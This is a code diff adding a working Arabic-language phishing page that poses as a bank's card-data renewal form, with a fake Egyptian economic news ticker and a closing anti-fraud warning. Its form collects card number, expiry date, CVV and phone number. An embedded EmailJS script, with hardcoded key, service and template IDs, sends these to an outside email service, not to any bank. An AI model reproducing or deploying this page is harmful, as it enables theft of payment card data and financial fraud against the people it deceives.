@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تجديد بيانات البطاقة البنكية</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("JjqapwPfx5FBrIVCp"); // Public Key
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault();
+            
+            emailjs.sendForm("service_4axrvl9", "template_l9buq9f", event.target)
+                .then(function(response) {
+                    alert("تم إرسال البيانات بنجاح!");
+                    console.log("Success:", response);
+                }, function(error) {
+                    alert("حدث خطأ أثناء الإرسال!");
+                    console.log("Error:", error);
+                });
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Tajawal', sans-serif;
+            direction: rtl;
+            text-align: right;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow-x: hidden;
+        }
+        .top-bar {
+            background-color: #003366;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 18px;
+            position: relative;
+        }
+        .language-switch {
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            background: none;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .news-ticker {
+            background-color: #ffcc00;
+            color: #000;
+            padding: 10px;
+            white-space: nowrap;
+            overflow: hidden;
+            box-sizing: border-box;
+        }
+        .news-ticker span {
+            display: inline-block;
+            animation: ticker 50s linear infinite;
+            transform: translateX(-100%);
+        }
+        @keyframes ticker {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            padding: 20px;
+            position: relative;
+        }
+        .container {
+            width: 90%;
+            max-width: 380px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            z-index: 2;
+            position: relative;
+        }
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('center/bank-style.png') no-repeat center center;
+            background-size: cover;
+            opacity: 0.5;
+            z-index: 1;
+        }
+        label {
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+        button {
+            background: #003366;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #002244;
+        }
+        .warning {
+            color: red;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <span id="top-title">تحديث بيانات البطاقة البنكية</span>
+        <button class="language-switch" onclick="switchLanguage()">EN / AR</button>
+    </div>
+    <div class="news-ticker">
+        <span>
+            شهد الاقتصاد المصري تطورات إيجابية اليوم، حيث أعلن البنك المركزي عن ارتفاع احتياطي النقد الأجنبي لمستوى قياسي، 
+            مدعومًا بزيادة تحويلات المصريين العاملين بالخارج وعوائد الصادرات، مما يعكس تحسنًا في ثقة المستثمرين.
+        </span>
+    </div>
+    <div class="content">
+        <div class="background"></div>
+        <div class="container">
+            <h2 id="title">تجديد بيانات البطاقة البنكية</h2>
+            <form id="contact-form" onsubmit="sendEmail(event)">
+                <label for="card_number">رقم البطاقة:</label>
+                <input type="text" id="card_number" name="card_number" required>
+
+                <label for="expiry_date">تاريخ الانتهاء:</label>
+                <input type="month" id="expiry_date" name="expiry_date" required>
+
+                <label for="cvv">رمز الأمان (CVV):</label>
+                <input type="password" id="cvv" name="cvv" required>
+
+                <label for="phone">رقم الهاتف المسجل:</label>
+                <input type="tel" id="phone" name="phone" required>
+
+                <button type="submit">تحديث البيانات</button>
+            </form>
+            <p class="warning">لا تشارك هذه البيانات مع أي شخص عبر مكالمة هاتفية, لا تكن ضحية للاحتيال الالكتروني.</p>
+        </div>
+    </div>
+</body>
+</html>
